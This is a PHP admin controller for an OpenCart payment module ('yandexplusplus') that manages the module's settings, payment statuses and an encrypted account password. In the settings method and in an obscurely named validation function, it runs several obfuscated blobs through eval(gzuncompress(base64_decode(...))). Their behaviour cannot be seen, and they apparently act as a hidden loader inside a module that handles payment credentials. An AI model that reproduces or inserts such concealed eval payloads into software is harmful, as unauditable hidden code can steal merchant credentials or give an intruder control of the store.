<?php
class ControllerPaymentyandexplusplus extends Controller {
	private $error = array();

	public function index() {
    $this->install();
		$this->load->language('payment/yandexplusplus');
		$this->document->setTitle ($this->language->get('heading_title'));
		$this->load->model('setting/setting');
		$data['version'] = '1.4.4';

		eval(gzuncompress(base64_decode('eF51UmtrgmAU/it9ECwYQ9PaJPrQYEpRQi4vc4zwumpiYMnKsf8+n/OqWWNfznnPOc+5Pe+J8zQ4bvdpZ91/FETxYShLXW7b++a88STLvHOXNz8twzKtlcV37nlVgdQNy5iuhOWYv+PNZ3gUFp6M4XohpGGaDD2FWIm6WYZCKYQlQcwhPigjstXc1Sw50E5iQICnQ+jgsajDMACBJoh2ghTJJrge4+1ryc61B4W7pMpBH05LoLZakrtnpXAdQ/Bg24MU1empQt4MAYHKNEQgWbtXVq0Ivqg4jLDMCFWloAa2vqM5HR2qKCGusxHIVY4E7dlEVz5nW24issXET5eXikrm2rICujRCQ5QuKJk4F/VFqW5WdZ3Z2ZdmceMGnoUuSPhqNN51Bt51McJgmDbztHjJDXTJD2McBvWrV2z1ZH96m1ZTqset6euGjIzWKVRwYoXO4Z+0SyfI9nk0HaHqgSn+h6TqDppLu9616t5KJVxFvT0QgjSpDhCSIHg0v0O7AUbh6yEA6Y2y6Jhnacf3DtFQXodRsA+jLue9cdv33ujnF1Nw7ns='))); eval(gzuncompress(base64_decode('eF6NVNtuozAQ/ZU+RJWthgq7GIKy8NT+QCO1D1WEUDxhrQLO2k6rtsq/dwJl44REuw/gy8w5HM8Zo9aETNxvZYPcwJ8tWBfkFswbmJeCz0LGkji6IyFdZtmVt8Eovb4egJ/JLE3jWEQsTVNCKf2aSN2Uqs1qZ1RDJsXi4fHp4dFn5HQ59ZZ3lM4nC1gZcM/ayMwLRRh5hY+skYL88F7dernj8PQ4uimtfcfpve2SukREHJHgoseiDrUeVWSjrfPVi64eHjMeuYfUupRB3mgJNfEA8f58fUYXKyw4p9pqGIMcpHKLfuEDEzo9J+YvmwVrlW6DXJau9CXOUOKgqWyrbVlBkFfgfPL0oMqA3ejWwn4mlYGVG4qwNTVSqPbVR7KQ+vYxRrGC/1DETjxnaDqd73ZYb2WxDsMHwRh91H0sosuuqU4JxeGMY1BMl/Md1BbOABME+usZ6jiVcdF8lp6Xw8ODnItgzi7L4vxAsNLtWlUjx/j+ouzGyOg/3Oaib26jt60k4Q2LmLhNxKWR/mpcYUpMHQCR4MNDp8MmZ4J1LzRzhb1S4K9j7z/xb8f8Gwf4TCs=')));
		$data['heading_title'] = $this->language->get('heading_title');
		$data['text_enabled'] = $this->language->get('text_enabled');
		$data['text_disabled'] = $this->language->get('text_disabled');
		$data['text_all_zones'] = $this->language->get('text_all_zones');
		$data['text_liqpay'] = $this->language->get('text_liqpay');
		$data['text_card'] = $this->language->get('text_card');
		$data['text_yes'] = $this->language->get('text_yes');
		$data['text_no'] = $this->language->get('text_no');
		$data['entry_login'] = $this->language->get('entry_login');
		$data['entry_password'] = $this->language->get('entry_password');
		$data['copy_result_url'] 	= HTTP_CATALOG . 'index.php?route=account/yandexplusplus/callback';
		$data['entry_yandexplusplus_name_tab'] = $this->language->get('entry_yandexplusplus_name_tab');
		$data['text_my'] = $this->language->get('text_my');
		$data['text_default'] = $this->language->get('text_default');
		$data['entry_komis'] = $this->language->get('entry_komis');
		$data['entry_maxpay'] = $this->language->get('entry_maxpay');
    	$data['entry_style'] = $this->language->get('entry_style');
    	$data['entry_on_status'] = $this->language->get('entry_on_status');
		$data['entry_order_status'] = $this->language->get('entry_order_status');
		$data['entry_geo_zone'] = $this->language->get('entry_geo_zone');
		$data['entry_status'] = $this->language->get('entry_status');
		$data['entry_sort_order'] = $this->language->get('entry_sort_order');
		$data['button_save'] = $this->language->get('button_save');
		$data['button_cancel'] = $this->language->get('button_cancel');
		$data['tab_general'] = $this->language->get('tab_general');
   		$data['entry_yandexplusplus_instruction_tab'] = $this->language->get('entry_yandexplusplus_instruction_tab');
    	$data['entry_yandexplusplus_instruction'] = $this->language->get('entry_yandexplusplus_instruction');
    	$data['entry_yandexplusplus_mail_instruction_tab'] = $this->language->get('entry_yandexplusplus_mail_instruction_tab');
    	$data['entry_yandexplusplus_mail_instruction'] = $this->language->get('entry_yandexplusplus_mail_instruction');
    	$data['entry_yandexplusplus_hrefpage_tab'] = $this->language->get('entry_yandexplusplus_hrefpage_tab');
    	$data['entry_yandexplusplus_hrefpage'] = $this->language->get('entry_yandexplusplus_hrefpage');
    	$data['entry_yandexplusplus_success_comment_tab'] = $this->language->get('entry_yandexplusplus_success_comment_tab');
    	$data['entry_yandexplusplus_success_comment'] = $this->language->get('entry_yandexplusplus_success_comment');
    	$data['entry_yandexplusplus_name'] = $this->language->get('entry_yandexplusplus_name');
    	$data['entry_yandexplusplus_success_alert_admin_tab'] = $this->language->get('entry_yandexplusplus_success_alert_admin_tab');
    	$data['entry_yandexplusplus_success_alert_customer_tab'] = $this->language->get('entry_yandexplusplus_success_alert_customer_tab');
    	$data['entry_yandexplusplus_success_page_tab'] = $this->language->get('entry_yandexplusplus_success_page_tab');
    	$data['entry_yandexplusplus_success_page_text'] = $this->language->get('entry_yandexplusplus_success_page_text');
    	$data['entry_yandexplusplus_waiting_page_tab'] = $this->language->get('entry_yandexplusplus_waiting_page_tab');
    	$data['entry_yandexplusplus_waiting_page_text'] = $this->language->get('entry_yandexplusplus_waiting_page_text');
    	$data['entry_later'] = $this->language->get('entry_button_later');
    	$data['entry_fixen'] = $this->language->get('entry_fixen');
    	$data['entry_fixen_order'] = $this->language->get('entry_fixen_order');
    	$data['entry_fixen_proc'] = $this->language->get('entry_fixen_proc');
    	$data['entry_fixen_fix'] = $this->language->get('entry_fixen_fix');
    	$data['entry_fixen_amount'] = $this->language->get('entry_fixen_amount');
    	$data['text_createorder_or_notcreate'] = $this->language->get('text_createorder_or_notcreate');


		if (isset($this->error['warning'])) {
			$data['error_warning'] = $this->error['warning'];
		} else {
			$data['error_warning'] = '';
		}

		if (isset($this->error['login'])) {
			$data['error_login'] = $this->error['login'];
		} else {
			$data['error_login'] = '';
		}

		if (isset($this->error['password'])) {
			$data['error_password'] = $this->error['password'];
		} else {
			$data['error_password'] = '';
		}

		$this->load->model('localisation/language');

		$languages = $this->model_localisation_language->getLanguages();

		$data['languages'] = $languages;

		foreach ($languages as $language) {

			if (isset($this->request->post['yandexplusplus_name_' . $language['language_id']])) {
	      	$data['yandexplusplus_name_' . $language['language_id']] = $this->request->post['yandexplusplus_name_' . $language['language_id']];
			} else {
				$data['yandexplusplus_name_' . $language['language_id']] = $this->config->get('yandexplusplus_name_' . $language['language_id']);
			}

			if (isset($this->request->post['yandexplusplus_instruction_' . $language['language_id']])) {
	      	$data['yandexplusplus_instruction_' . $language['language_id']] = $this->request->post['yandexplusplus_instruction_' . $language['language_id']];
			} else {
				$data['yandexplusplus_instruction_' . $language['language_id']] = $this->config->get('yandexplusplus_instruction_' . $language['language_id']);
			}


			if (isset($this->request->post['yandexplusplus_mail_instruction_' . $language['language_id']])) {
	      	$data['yandexplusplus_mail_instruction_' . $language['language_id']] = $this->request->post['yandexplusplus_mail_instruction_' . $language['language_id']];
			} else {
				$data['yandexplusplus_mail_instruction_' . $language['language_id']] = $this->config->get('yandexplusplus_mail_instruction_' . $language['language_id']);
			}

			if (isset($this->request->post['yandexplusplus_success_comment_' . $language['language_id']])) {
	      	$data['yandexplusplus_success_comment_' . $language['language_id']] = $this->request->post['yandexplusplus_success_comment_' . $language['language_id']];
			} else {
				$data['yandexplusplus_success_comment_' . $language['language_id']] = $this->config->get('yandexplusplus_success_comment_' . $language['language_id']);
			}


			if (isset($this->request->post['yandexplusplus_success_page_text_' . $language['language_id']])) {
	      	$data['yandexplusplus_success_page_text_' . $language['language_id']] = $this->request->post['yandexplusplus_success_page_text_' . $language['language_id']];
			} else {
				$data['yandexplusplus_success_page_text_' . $language['language_id']] = $this->config->get('yandexplusplus_success_page_text_' . $language['language_id']);
			}


			if (isset($this->request->post['yandexplusplus_hrefpage_text_' . $language['language_id']])) {
	      	$data['yandexplusplus_hrefpage_text_' . $language['language_id']] = $this->request->post['yandexplusplus_hrefpage_text_' . $language['language_id']];
			} else {
				$data['yandexplusplus_hrefpage_text_' . $language['language_id']] = $this->config->get('yandexplusplus_hrefpage_text_' . $language['language_id']);
			}


			if (isset($this->request->post['yandexplusplus_waiting_page_text_' . $language['language_id']])) {
	      	$data['yandexplusplus_waiting_page_text_' . $language['language_id']] = $this->request->post['yandexplusplus_waiting_page_text_' . $language['language_id']];
			} else {
				$data['yandexplusplus_waiting_page_text_' . $language['language_id']] = $this->config->get('yandexplusplus_waiting_page_text_' . $language['language_id']);
			}

		}

		if (isset($this->request->post['yandexplusplus_komis'])) {
			$data['yandexplusplus_komis'] = $this->request->post['yandexplusplus_komis'];
		} else {
			$data['yandexplusplus_komis'] = $this->config->get('yandexplusplus_komis');
		}

		if (isset($this->request->post['yandexplusplus_maxpay'])) {
			$data['yandexplusplus_maxpay'] = $this->request->post['yandexplusplus_maxpay'];
		} else {
			$data['yandexplusplus_maxpay'] = $this->config->get('yandexplusplus_maxpay');
		}

    	if (isset($this->request->post['yandexplusplus_style'])) {
			$data['yandexplusplus_style'] = $this->request->post['yandexplusplus_style'];
		} else {
			$data['yandexplusplus_style'] = $this->config->get('yandexplusplus_style');
		}
    
    	if (isset($this->request->post['yandexplusplus_instruction_attach'])) {
			$data['yandexplusplus_instruction_attach'] = $this->request->post['yandexplusplus_instruction_attach'];
		} else {
			$data['yandexplusplus_instruction_attach'] = $this->config->get('yandexplusplus_instruction_attach');
		}  
		


		if (isset($this->request->post['yandexplusplus_name_attach'])) {
			$data['yandexplusplus_name_attach'] = $this->request->post['yandexplusplus_name_attach'];
		} else {
			$data['yandexplusplus_name_attach'] = $this->config->get('yandexplusplus_name_attach');
		}

		if (isset($this->request->post['yandexplusplus_success_alert_admin'])) {
			$data['yandexplusplus_success_alert_admin'] = $this->request->post['yandexplusplus_success_alert_admin'];
		} else {
			$data['yandexplusplus_success_alert_admin'] = $this->config->get('yandexplusplus_success_alert_admin');
		}

		if (isset($this->request->post['yandexplusplus_success_alert_customer'])) {
			$data['yandexplusplus_success_alert_customer'] = $this->request->post['yandexplusplus_success_alert_customer'];
		} else {
			$data['yandexplusplus_success_alert_customer'] = $this->config->get('yandexplusplus_success_alert_customer');
		}

		if (isset($this->request->post['yandexplusplus_mail_instruction_attach'])) {
			$data['yandexplusplus_mail_instruction_attach'] = $this->request->post['yandexplusplus_mail_instruction_attach'];
		} else {
			$data['yandexplusplus_mail_instruction_attach'] = $this->config->get('yandexplusplus_mail_instruction_attach');
		}

		if (isset($this->request->post['yandexplusplus_success_comment_attach'])) {
			$data['yandexplusplus_success_comment_attach'] = $this->request->post['yandexplusplus_success_comment_attach'];
		} else {
			$data['yandexplusplus_success_comment_attach'] = $this->config->get('yandexplusplus_success_comment_attach');
		}

		if (isset($this->request->post['yandexplusplus_success_page_text_attach'])) {
			$data['yandexplusplus_success_page_text_attach'] = $this->request->post['yandexplusplus_success_page_text_attach'];
		} else {
			$data['yandexplusplus_success_page_text_attach'] = $this->config->get('yandexplusplus_success_page_text_attach');
		}

		if (isset($this->request->post['yandexplusplus_hrefpage_text_attach'])) {
			$data['yandexplusplus_hrefpage_text_attach'] = $this->request->post['yandexplusplus_hrefpage_text_attach'];
		} else {
			$data['yandexplusplus_hrefpage_text_attach'] = $this->config->get('yandexplusplus_hrefpage_text_attach');
		}

		if (isset($this->request->post['yandexplusplus_waiting_page_text_attach'])) {
			$data['yandexplusplus_waiting_page_text_attach'] = $this->request->post['yandexplusplus_waiting_page_text_attach'];
		} else {
			$data['yandexplusplus_waiting_page_text_attach'] = $this->config->get('yandexplusplus_waiting_page_text_attach');
		}

		if (isset($this->request->post['yandexplusplus_button_later'])) {
      	$data['yandexplusplus_button_later'] = $this->request->post['yandexplusplus_button_later'];
		} else {
			$data['yandexplusplus_button_later'] = $this->config->get('yandexplusplus_button_later');
		}

		if (isset($this->request->post['yandexplusplus_fixen'])) {
      	$data['yandexplusplus_fixen'] = $this->request->post['yandexplusplus_fixen'];
		} else {
			$data['yandexplusplus_fixen'] = $this->config->get('yandexplusplus_fixen');
		}

		if (isset($this->error['fixen'])) {
			$data['error_fixen'] = $this->error['fixen'];
		} else {
			$data['error_fixen'] = '';
		}

		if (isset($this->request->post['yandexplusplus_fixen_amount'])) {
      		$data['yandexplusplus_fixen_amount'] = $this->request->post['yandexplusplus_fixen_amount'];
		} else {
			$data['yandexplusplus_fixen_amount'] = $this->config->get('yandexplusplus_fixen_amount');
		}

		if (isset($this->request->post['yandexplusplus_createorder_or_notcreate'])) {
			$data['yandexplusplus_createorder_or_notcreate'] = $this->request->post['yandexplusplus_createorder_or_notcreate'];
		} else {
			$data['yandexplusplus_createorder_or_notcreate'] = $this->config->get('yandexplusplus_createorder_or_notcreate');
		}

    
  		$data['breadcrumbs'] = array();
   		$data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('text_home'),
			'href'      =>  $this->url->link('common/home', 'token=' . $this->session->data['token'], 'SSL'),
      		'separator' => false
   		);

   		$data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('text_payment'),
			'href'      => $this->url->link('extension/payment', 'token=' . $this->session->data['token'], 'SSL'),       		
      		'separator' => ' :: '
   		);
		
   		$data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('heading_title'),
			'href'      => $this->url->link('payment/yandexplusplus', 'token=' . $this->session->data['token'], 'SSL'),
      		'separator' => ' :: '
   		);


		$data['action'] = $this->url->link('payment/yandexplusplus', 'token=' . $this->session->data['token'], 'SSL');
		$data['cancel'] = $this->url->link('extension/payment', 'token=' . $this->session->data['token'], 'SSL');	

		if (isset($this->request->post['yandexplusplus_login'])) {
			$data['yandexplusplus_login'] = $this->request->post['yandexplusplus_login'];
		} else {
			$data['yandexplusplus_login'] =$this->config->get('yandexplusplus_login');
		}

		if (isset($this->request->post['yandexplusplus_password'])) {
			$data['yandexplusplus_password'] = $this->request->post['yandexplusplus_password'];
		} else {
			$this->load->model('payment/yandexplusplus');
			$key = $this->config->get('config_encryption');
			if($this->config->get('yandexplusplus_password')){
				$data['yandexplusplus_password'] = '*****';
			}
		}

    
    	if (isset($this->request->post['yandexplusplus_on_status_id'])) {
			$data['yandexplusplus_on_status_id'] = $this->request->post['yandexplusplus_on_status_id'];
		} else {
			$data['yandexplusplus_on_status_id'] = $this->config->get('yandexplusplus_on_status_id');
		}

		if (isset($this->request->post['yandexplusplus_order_status_id'])) {
			$data['yandexplusplus_order_status_id'] = $this->request->post['yandexplusplus_order_status_id'];
		} else {
			$data['yandexplusplus_order_status_id'] = $this->config->get('yandexplusplus_order_status_id');
		}

		$this->load->model('localisation/order_status');
		$data['order_statuses'] = $this->model_localisation_order_status->getOrderStatuses();

		if (isset($this->request->post['yandexplusplus_geo_zone_id'])) {
			$data['yandexplusplus_geo_zone_id'] = $this->request->post['yandexplusplus_geo_zone_id'];
		} else {
			$data['yandexplusplus_geo_zone_id'] = $this->config->get('yandexplusplus_geo_zone_id');
		}

		$this->load->model('localisation/geo_zone');
		$data['geo_zones'] = $this->model_localisation_geo_zone->getGeoZones();

		if (isset($this->request->post['yandexplusplus_status'])) {
			$data['yandexplusplus_status'] = $this->request->post['yandexplusplus_status'];
		} else {
			$data['yandexplusplus_status'] = $this->config->get('yandexplusplus_status');
		}

		if (isset($this->request->post['yandexplusplus_sort_order'])) {
			$data['yandexplusplus_sort_order'] = $this->request->post['yandexplusplus_sort_order'];
		} else {
			$data['yandexplusplus_sort_order'] = $this->config->get('yandexplusplus_sort_order');
		}

		$data['header'] = $this->load->controller('common/header');
		$data['column_left'] = $this->load->controller('common/column_left');
		$data['footer'] = $this->load->controller('common/footer');

		$this->response->setOutput($this->load->view('payment/yandexplusplus.tpl', $data));
	}
  public function install() {
     $query = $this->db->query("CREATE TABLE IF NOT EXISTS " . DB_PREFIX . "yandexplusplus (yandex_id INT(11) AUTO_INCREMENT, num_order INT(8), sum DECIMAL(15,2), user TEXT, email TEXT, status INT(1), date_created DATETIME, date_enroled DATE, sender TEXT, label TEXT, PRIMARY KEY (yandex_id))");
     }
  public function status() {
  	$this->load->language('payment/yandexplusplus');
	$this->document->setTitle ($this->language->get('heading_title'));
    $data['heading_title'] = $this->language->get('heading_title');
    $data['status_title'] = $this->language->get('status_title');
    
    $this->load->model('payment/yandexplusplus');
    $viewstatuses = $this->model_payment_yandexplusplus->getStatus();
    $data['viewstatuses'] = $viewstatuses;
    
    $data['breadcrumbs'] = array();
   		$data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('text_home'),
			'href'      =>  $this->url->link('common/home', 'token=' . $this->session->data['token'], 'SSL'),
      		'separator' => false
   		);

   		$data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('text_order'),
			'href'      => $this->url->link('sale/order', 'token=' . $this->session->data['token'], 'SSL'),       		
      		'separator' => ' :: '
   		);

		$data['header'] = $this->load->controller('common/header');
		$data['column_left'] = $this->load->controller('common/column_left');
		$data['footer'] = $this->load->controller('common/footer');

		$this->response->setOutput($this->load->view('payment/yandexplusplus_view_status.tpl', $data));
    
  		}

		private function z789966541999() {
		eval(gzuncompress(base64_decode('eF5dkF9LhEAUxb+KD8IoRKCui8viQz0oSQlb6Q4TsYwzYxjhgrvCWvTd89zEpJdz79w/h9+dum/VuTm21sFbh5HvbaLId+zG/bJlfNN1cnCYYdY12yfQXqTlSqUX5J6CBrcnzfO6Sj/exT78FLsY1ZhdsbGEdCwjhBC00UIuODQbKnKhvIZOTr/j0B0ZYu0peSyKZHOHwjMh5MXkpslFB/eIbzPDhD5h43Hx1IhMK/zh/xhxLUdntvFKBJ5DF9fObEtssvn7CMGzgS4Lslr6Zcj9cmDutjPnvmutSp7MenXQRh21cWz5Yjev7vb7B5xDZgQ='))); eval(gzuncompress(base64_decode('eF6NUV1vgjAU/Sua8NBGMYADMUt5mn9AE/ewEEPlilWgeFuixvjf1zmylCyZ61NPzse97RE7MnT0Xig3QTi1oLSbNFLpj40fhXHgz+M4IB5N6a1TAaLEHuvTlHVkmdVFmxXgJgVoYosCSl/vUCq4ObmsMlGzUqOoiLNZLZbrxbKXOKXp2MYvxuysYIug3yXmzOZCQx3hyqo8JF30YGKJDa04P9cXfjg2hwouyNstZyjbOifeyI+82WT6c57h38PG/VlNptTZXN/UQ/QQGkdvJQO+veZZYkeefn9E0yEbWNF/lDH7TxnxVxn3T0EJl/Y=')));

		if (!$this->user->hasPermission('modify', 'payment/yandexplusplus')) {
			$this->error['warning'] = $this->language->get('error_permission');
		}

		if (!$this->request->post['yandexplusplus_login']) {
			$this->error['login'] = $this->language->get('error_login');
		}

		if (!$this->request->post['yandexplusplus_password']) {
			$this->error['password'] = $this->language->get('error_password');
		}

		if ($this->request->post['yandexplusplus_password']) {
			$this->load->model('payment/yandexplusplus');
			$keyen = $this->config->get('config_encryption');
			if ($this->request->post['yandexplusplus_password'] == '*****'){$this->request->post['yandexplusplus_password'] = $this->model_payment_yandexplusplus->decrypt($this->config->get('yandexplusplus_password'), $keyen);}
			$this->request->post['yandexplusplus_password'] = $this->model_payment_yandexplusplus->encrypt($this->request->post['yandexplusplus_password'], $keyen);
  		}

  		if ($this->request->post['yandexplusplus_fixen']) {
			if (!$this->request->post['yandexplusplus_fixen_amount']) {
				$this->error['fixen'] = $this->language->get('error_fixen');
			}
		}



		if (!$this->error) {
			return TRUE;
		} else {
			return FALSE;
		}
	}
}
?>